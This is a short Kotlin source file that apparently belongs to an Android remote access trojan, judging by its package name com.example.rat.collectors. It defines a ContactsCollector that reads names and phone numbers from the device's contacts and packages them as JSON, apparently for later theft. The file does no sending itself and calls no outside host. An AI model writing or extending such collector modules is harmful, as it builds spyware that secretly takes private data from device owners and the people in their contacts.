package com.example.rat.collectors

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object ContactsCollector {
    fun get(context: Context, limit: Int): JSONArray {
        val out = JSONArray()
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        context.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < limit) {
                out.put(
                    JSONObject()
                        .put("name", cursor.getString(0) ?: "")
                        .put("number", cursor.getString(1) ?: "")
                )
                count++
            }
        }
        return out
    }
}
